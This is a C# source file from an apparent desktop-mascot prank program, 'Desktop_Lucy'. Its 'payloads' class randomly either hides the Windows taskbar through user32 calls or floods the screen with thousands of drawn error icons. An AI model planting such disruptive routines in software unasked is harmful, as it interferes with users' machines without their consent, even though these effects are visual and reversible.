using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Desktop_Lucy
{
    public class payloads
    {
        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);
        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

        public Random rnd = new Random();
        int _plcount = 2;

        public void talk(string text, int suicideTime = 2000)
        {
            lucySpeak s = new lucySpeak(text, suicideTime);
            s.Show();
        }

        public int activateRandomPayload()
        {
            int usePayload = rnd.Next(0, _plcount);
            switch (usePayload)
            {
                case 0:
                    removeTaskbar();
                    break;
                case 1:
                    iconSpam();
                    break;
            }
            return 1;
        }

        public int removeTaskbar()
        {
            int SW_HIDE = 0;
            int hWnd = FindWindow("Shell_TrayWnd", "");
            ShowWindow(hWnd, SW_HIDE);
            talk("Yoink!");
            return 1;
        }

        public int iconSpam()
        {
            new Thread(() =>
            {
                Thread.CurrentThread.IsBackground = true;
                Graphics g = Graphics.FromHwnd((IntPtr.Zero));
                Rectangle resolution = Screen.PrimaryScreen.Bounds;
                for (int i = 0; i < 10000; i++)
                {
                    g.DrawIcon(SystemIcons.Error, rnd.Next(0, resolution.Width), rnd.Next(0, resolution.Height));
                }
            }).Start();

            return 1;
        }
    }
}
